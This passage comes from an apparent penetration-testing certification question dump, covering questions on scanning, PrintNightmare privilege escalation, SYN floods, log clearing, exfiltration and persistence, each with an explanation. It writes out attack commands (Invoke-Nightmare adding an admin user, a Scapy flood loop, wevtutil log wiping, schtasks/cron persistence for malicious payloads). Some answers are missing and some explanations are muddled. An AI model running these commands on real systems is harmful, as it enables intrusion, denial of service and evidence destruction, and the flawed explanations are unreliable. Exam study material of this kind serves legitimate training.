* This method is stealthier than others and is commonly used in advanced persistent threat (APT)
scenarios.
* Why Not Other Options?
* B (Remote desktop software): Installing such software is noisy and can easily be detected by
monitoring tools.
* C (User logon script): While it provides persistence, it is less reliable and more detectable than a
system service.
* D (Kerberoasting): This is a credential-stealing technique and does not establish persistence.

A penetration tester is conducting a vulnerability scan. The tester wants to see any vulnerabilities
that may be visible from outside of the organization. Which of the following scans should the
penetration tester perform?
A. SAST
B. Sidecar
C. Unauthenticated
D. Host-based
Answer: C ( LEAVE A REPLY )
To see any vulnerabilities that may be visible from outside of the organization, the penetration
tester should perform an unauthenticated scan.
* Unauthenticated Scan:
* Definition: An unauthenticated scan is conducted without providing any credentials to the
scanning tool. It simulates the perspective of an external attacker who does not have any prior
access to the system.
* Purpose: Identifies vulnerabilities that are exposed to the public and can be exploited without
authentication. This includes open ports, outdated software, and misconfigurations visible to the
outside world.
* Comparison with Other Scans:
* SAST (Static Application Security Testing): Analyzes source code for vulnerabilities, typically
used during the development phase and not suitable for external vulnerability scanning.
* Sidecar: This term is generally associated with microservices architecture and is not relevant to
the context of vulnerability scanning.
* Host-based: Involves scanning from within the network and often requires authenticated access
to the host to identify vulnerabilities. It is not suitable for determining external vulnerabilities.
* Pentest References:
* External Vulnerability Assessment: Conducting unauthenticated scans helps identify the attack
surface exposed to external threats and prioritizes vulnerabilities that are accessible from the
internet.
* Tools: Common tools for unauthenticated scanning include Nessus, OpenVAS, and Nmap.

By performing an unauthenticated scan, the penetration tester can identify vulnerabilities that an
external attacker could exploit without needing any credentials or internal access.

NEW QUESTION: 95
During an assessment, a penetration tester manages to get RDP access via a low-privilege user.
The tester attempts to escalate privileges by running the following commands:
Import-Module .\PrintNightmare.ps1
Invoke-Nightmare -NewUser "hacker" -NewPassword "Password123!" -DriverName "Print" The
tester attempts to further enumerate the host with the new administrative privileges by using the
runas command. However, the access level is still low. Which of the following actions should the
penetration tester take next?
A. Log off and log on with "hacker".
B. Attempt to add another user.
C. Bypass the execution policy.
D. Add a malicious printer driver.
Answer: ( SHOW ANSWER )
In the scenario where a penetration tester uses the PrintNightmare exploit to create a new user
with administrative privileges but still experiences low-privilege access, the tester should log off
and log on with the new "hacker" account to escalate privileges correctly.
* PrintNightmare Exploit:
* PrintNightmare (CVE-2021-34527) is a vulnerability in the Windows Print Spooler service that
allows remote code execution and local privilege escalation.
* The provided commands are intended to exploit this vulnerability to create a new user with
administrative privileges.
* Commands Breakdown:
* Import-Module .\PrintNightmare.ps1: Loads the PrintNightmare exploit script.
* Invoke-Nightmare -NewUser "hacker" -NewPassword "Password123!" -DriverName "Print":
Executes the exploit, creating a new user "hacker" with administrative privileges.
* Issue:
* The tester still experiences low privileges despite running the exploit successfully.
* This could be due to the current session not reflecting the new privileges.
* Solution:
* Logging off and logging back on with the new "hacker" account will start a new session with the
updated administrative privileges.
* This ensures that the new privileges are applied correctly.
Pentest References:
* Privilege Escalation: After gaining initial access, escalating privileges is crucial to gain full
control over the target system.
* Session Management: Understanding how user sessions work and ensuring that new privileges

are recognized by starting a new session.
* The use of the PrintNightmare exploit highlights a specific technique for privilege escalation
within Windows environments.
By logging off and logging on with the new "hacker" account, the penetration tester can ensure
the new administrative privileges are fully applied, allowing for further enumeration and
exploitation of the target system.
NEW QUESTION: 96
A penetration tester is testing a power plant's network and needs to avoid disruption to the grid.
Which of the following methods is most appropriate to identify vulnerabilities in the network?
A. Configure a network scanner engine and execute the scan.
B. Execute a testing framework to validate vulnerabilities on the devices.
C. Configure a port mirror and review the network traffic.
D. Run a network mapper tool to get an understanding of the devices.
Answer: ( SHOW ANSWER )
When testing a power plant's network and needing to avoid disruption to the grid, configuring a
port mirror and reviewing the network traffic is the most appropriate method to identify
vulnerabilities without causing disruptions.
* Port Mirroring:
* Definition: Port mirroring (SPAN - Switched Port Analyzer) is a method of monitoring network
traffic by duplicating packets from one or more switch ports to another port where a monitoring
device is connected.
* Purpose: Allows passive monitoring of network traffic without impacting network operations or
device performance.
* Avoiding Disruption:
* Non-Intrusive: Port mirroring is non-intrusive and does not generate additional traffic or load on
the network devices, making it suitable for sensitive environments like power plants where
disruption is not acceptable.
* Other Options:
* Network Scanner Engine: Active scanning might disrupt network operations or devices, which is
not suitable for critical infrastructure.
* Testing Framework: Validating vulnerabilities on devices might involve active testing, which can
be disruptive.
* Network Mapper Tool: Running a network mapper tool (like Nmap) actively scans the network
and might disrupt services.
Pentest References:
* Passive Monitoring: Passive techniques such as port mirroring are essential in environments
where maintaining operational integrity is critical.
* Critical Infrastructure Security: Understanding the need for non-disruptive methods in critical
infrastructure penetration testing to ensure continuous operations.
By configuring a port mirror and reviewing network traffic, the penetration tester can identify

vulnerabilities in the power plant's network without risking disruption to the grid.
NEW QUESTION: 97
A penetration tester is authorized to perform a DoS attack against a host on a network. Given the
following input:
ip = IP("192.168.50.2")
tcp = TCP(sport=RandShort(), dport=80, flags="S")
raw = RAW(b"X"*1024)
p = ip/tcp/raw
send(p, loop=1, verbose=0)
Which of the following attack types is most likely being used in the test?
A. MDK4
B. Smurf attack
C. FragAttack
D. SYN flood
Answer: ( SHOW ANSWER )
A SYN flood attack exploits the TCP handshake by sending a succession of SYN requests to a
target's system.
Each request initializes a connection that the target system must acknowledge, thus consuming
resources.
* Understanding the Script:
* ip = IP("192.168.50.2"): Sets the destination IP address to 192.168.50.2.
* tcp = TCP(sport=RandShort(), dport=80, flags="S"): Creates a TCP packet with a random
source port, destination port 80, and the SYN flag set.
* raw = RAW(b"X"*1024): Adds 1024 bytes of data to the packet.
* p = ip/tcp/raw: Combines the IP, TCP, and RAW layers into a single packet.
* send(p, loop=1, verbose=0): Sends the packet in an infinite loop without verbose output.
* Purpose of SYN Flood:
* Resource Exhaustion: By sending numerous SYN requests, the target's connection table fills
up, preventing legitimate connections.
* Denial of Service: The target system becomes overwhelmed and unable to process further
requests, effectively causing a denial of service.
* Detection and Mitigation:
* Rate Limiting: Implement rate limiting on SYN packets.
* SYN Cookies: Use SYN cookies to handle the connection requests without allocating resources
immediately.
* Firewalls and IDS: Deploy firewalls and Intrusion Detection Systems (IDS) to detect and mitigate
SYN flood attacks.
* References from Pentesting Literature:
* SYN flood attacks are a classic example of a denial-of-service attack and are commonly
discussed in penetration testing guides and HTB write-ups for understanding network-based

attacks.Step-by-Step ExplanationReferences:

NEW QUESTION: 98
During a security assessment, a penetration tester gains access to an internal server and
manipulates some data to hide its presence. Which of the following is the best way for the
penetration tester to hide the activities performed?
A. Clear the Windows event logs.
B. Modify the system time.
C. Alter the log permissions.
D. Reduce the log retention settings.
Answer: ( SHOW ANSWER )
During a penetration test, one of the critical steps for maintaining access and covering tracks is to
clear evidence of the attack. Manipulating data to hide activities on an internal server involves
ensuring that logs and traces of the attack are removed. Here's a detailed explanation of why
clearing the Windows event logs is the best method for this scenario:
* Understanding Windows Event Logs: Windows event logs are a key forensic artifact that records
system, security, and application events. These logs can provide detailed information about user
activities, system changes, and potential security incidents.
* Why Clear Windows Event Logs:
* Comprehensive Coverage: Clearing the event logs removes all recorded events, including login
attempts, application errors, and security alerts. This makes it difficult for an investigator to trace
back the actions performed by the attacker.
* Avoiding Detection: Penetration testers clear event logs to ensure that their presence and
activities are not detected by system administrators or security monitoring tools.
* Method to Clear Event Logs:
* Use the built-in Windows command line utility wevtutil to clear logs. For example:
shell
Copy code
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
* These commands clear the System, Security, and Application logs, respectively.
* Alternative Options and Their Drawbacks:
* Modify the System Time: Changing the system time can create confusion but is easily
detectable and can be reverted. It does not erase existing log entries.
* Alter Log Permissions: Changing permissions might prevent new entries but does not remove
existing ones and can alert administrators to suspicious activity.
* Reduce Log Retention Settings: This can limit future logs but does not affect already recorded
logs and can be easily noticed by administrators.

* Case References:
* HTB Writeups: Many Hack The Box (HTB) writeups demonstrate the importance of clearing logs
post-exploitation to maintain stealth. For example, in the "Gobox" and "Writeup" machines,
maintaining a low profile involved managing log data to avoid detection.
* Real-World Scenarios: In real-world penetration tests, attackers often clear logs to avoid
detection by forensic investigators and incident response teams. This step is crucial during red
team engagements and advanced persistent threat (APT) simulations.
In conclusion, clearing Windows event logs is a well-established practice for hiding activities
during a penetration test. It is the most effective way to remove evidence of the attack from the
system, thereby maintaining stealth and ensuring that the tester's actions remain undetected.
NEW QUESTION: 99
During a security audit, a penetration tester wants to run a process to gather information about a
target network's domain structure and associated IP addresses. Which of the following tools
should the tester use?
A. Dnsenum
B. Nmap
C. Netcat
D. Wireshark
Answer: ( SHOW ANSWER )
Dnsenum is a tool specifically designed to gather information about DNS, including domain
structure and associated IP addresses. Here's why option A is correct:
* Dnsenum: This tool is used for DNS enumeration and can gather information about a domain's
DNS records, subdomains, IP addresses, and other related information. It is highly effective for
mapping out a target network's domain structure.
* Nmap: While a versatile network scanning tool, Nmap is more focused on port scanning and
service detection rather than detailed DNS enumeration.
* Netcat: This is a network utility for reading and writing data across network connections, not for
DNS enumeration.
* Wireshark: This is a network protocol analyzer used for capturing and analyzing network traffic
but not specifically for gathering DNS information.
References from Pentest:
* Anubis HTB: Shows the importance of using DNS enumeration tools like Dnsenum to gather
detailed information about the target's domain structure.
* Forge HTB: Demonstrates the process of using specialized tools to collect DNS and IP
information efficiently.
NEW QUESTION: 100
During a penetration test, the tester identifies several unused services that are listening on all
targeted internal laptops. Which of the following technical controls should the tester recommend
to reduce the risk of compromise?

A. Multifactor authentication
B. Patch management
C. System hardening
D. Network segmentation
Answer: ( SHOW ANSWER )
When a penetration tester identifies several unused services listening on targeted internal
laptops, the most appropriate recommendation to reduce the risk of compromise is system
hardening. Here's why:
* System Hardening:
* Purpose: System hardening involves securing systems by reducing their surface of vulnerability.
This includes disabling unnecessary services, applying security patches, and configuring systems
securely.
* Impact: By disabling unused services, the attack surface is minimized, reducing the risk of these
services being exploited by attackers.
* Comparison with Other Controls:
* Multifactor Authentication (A): While useful for securing authentication, it does not address the
issue of unused services running on the system.
* Patch Management (B): Important for addressing known vulnerabilities but not specifically
related to disabling unused services.
* Network Segmentation (D): Helps in containing breaches but does not directly address the issue
of unnecessary services.
System hardening is the most direct control for reducing the risk posed by unused services,
making it the best recommendation.
NEW QUESTION: 101
Which of the following is the most efficient way to infiltrate a file containing data that could be
sensitive?
A. Use steganography and send the file over FTP
B. Compress the file and send it using TFTP
C. Split the file in tiny pieces and send it over dnscat
D. Encrypt and send the file over HTTPS
Answer: ( SHOW ANSWER )
When considering efficiency and security for exfiltrating sensitive data, the chosen method must
ensure data confidentiality and minimize the risk of detection. Here's an analysis of each option:
* Use steganography and send the file over FTP (Option A):

* Explanation: Steganography hides data within other files, such as images. FTP is a protocol for
transferring files.
* Drawbacks: FTP is not secure as it transmits data in clear text, making it susceptible to
interception. Steganography can add an extra layer of obfuscation, but the use of FTP makes this
option insecure.
* Compress the file and send it using TFTP (Option B):
* Explanation: TFTP is a simple file transfer protocol that lacks encryption.
* Drawbacks: TFTP is inherently insecure because it does not support encryption, making it easy
for attackers to intercept the data during transfer.
* Split the file in tiny pieces and send it over dnscat (Option C):
* Explanation: dnscat is a tool for tunneling data over DNS.
* Drawbacks: While effective at evading detection by using DNS, splitting the file and managing
the reassembly adds complexity. Additionally, large data transfers over DNS can raise suspicion.
* Encrypt and send the file over HTTPS:
* Explanation: Encrypting the file ensures that its contents are protected during transfer. HTTPS
provides a secure, encrypted channel for communication over the internet.
* Advantages: HTTPS is widely used and trusted, making it less likely to raise suspicion.
Encryption ensures the data remains confidential during transit.
NEW QUESTION: 102
A penetration tester presents the following findings to stakeholders:
Control | Number of findings | Risk | Notes
Encryption | 1 | Low | Weak algorithm noted
Patching | 8 | Medium | Unsupported systems
System hardening | 2 | Low | Baseline drift observed
Secure SDLC | 10 | High | Libraries have vulnerabilities
Password policy | 0 | Low | No exceptions noted
Based on the findings, which of the following recommendations should the tester make? (Select
two).
A. Develop a secure encryption algorithm.
B. Deploy an asset management system.
C. Write an SDLC policy.
D. Implement an SCA tool.
E. Obtain the latest library version.
F. Patch the libraries.
Answer: D,E ( LEAVE A REPLY )
Based on the findings, the focus should be on addressing vulnerabilities in libraries and ensuring
their security. Here's why options D and E are correct:
* Implement an SCA Tool:
* SCA (Software Composition Analysis) tools are designed to analyze and manage open-source
components in an application. Implementing an SCA tool would help in identifying and managing

vulnerabilities in libraries, aligning with the finding of vulnerable libraries in the secure SDLC
process.
* This recommendation addresses the high-risk finding related to the Secure SDLC by providing a
systematic approach to manage and mitigate vulnerabilities in software dependencies.
* Obtain the Latest Library Version:
* Keeping libraries up to date is a fundamental practice in maintaining the security of an
application. Ensuring that the latest, most secure versions of libraries are used directly addresses
the high-risk finding related to vulnerable libraries.
* This recommendation is a direct and immediate action to mitigate the identified vulnerabilities.
Other Options Analysis:
* Develop a Secure Encryption Algorithm: This is not practical or necessary given that the issue is
with the use of a weak algorithm, not the need to develop a new one.
* Deploy an Asset Management System: While useful, this is not directly related to the identified
high- risk issue of vulnerable libraries.
* Write an SDLC Policy: While helpful, the more immediate and effective actions involve
implementing tools and processes to manage and update libraries.
References from Pentest:
* Horizontall HTB: Demonstrates the importance of managing software dependencies and using
tools to identify and mitigate vulnerabilities in libraries.
* Writeup HTB: Highlights the need for keeping libraries updated to ensure application security
and mitigate risks.
Conclusion:
Options D and E, implementing an SCA tool and obtaining the latest library version, are the most
appropriate recommendations to address the high-risk finding related to vulnerable libraries in the
Secure SDLC process.
NEW QUESTION: 103
As part of an engagement, a penetration tester wants to maintain access to a compromised
system after rebooting. Which of the following techniques would be best for the tester to use?
A. Establishing a reverse shell
B. Executing a process injection attack
C. Creating a scheduled task
D. Performing a credential-dumping attack
Answer: ( SHOW ANSWER )
To maintain access to a compromised system after rebooting, a penetration tester should create
a scheduled task. Scheduled tasks are designed to run automatically at specified times or when
certain conditions are met, ensuring persistence across reboots.
* Persistence Mechanisms:
* Scheduled Task: Creating a scheduled task ensures that a specific program or script runs
automatically according to a set schedule or in response to certain events, including system
startup. This makes it a reliable method for maintaining access after a system reboot.* Reverse Shell: While establishing a reverse shell provides immediate access, it typically does

not survive a system reboot unless coupled with another persistence mechanism.
* Process Injection: Injecting a malicious process into another running process can provide
stealthy access but may not persist through reboots.
* Credential Dumping: Dumping credentials allows for re-access by using stolen credentials, but it
does not ensure automatic access upon reboot.
* Creating a Scheduled Task:
* On Windows, the schtasks command can be used to create scheduled tasks. For example:
schtasks /create /tn "Persistence" /tr "C:\path\to\malicious.exe" /sc onlogon /ru SYSTEM
* On Linux, a cron job can be created by editing the crontab:
(crontab -l; echo "@reboot /path/to/malicious.sh") | crontab -
* Pentest References:
* Maintaining persistence is a key objective in post-exploitation. Scheduled tasks (Windows Task
Scheduler) and cron jobs (Linux) are commonly used techniques.
* References to real-world scenarios include creating scheduled tasks to execute malware,
keyloggers, or reverse shells automatically on system startup.
By creating a scheduled task, the penetration tester ensures that their access method (e.g.,
reverse shell, malware) is executed automatically whenever the system reboots, providing reliable
persistence.
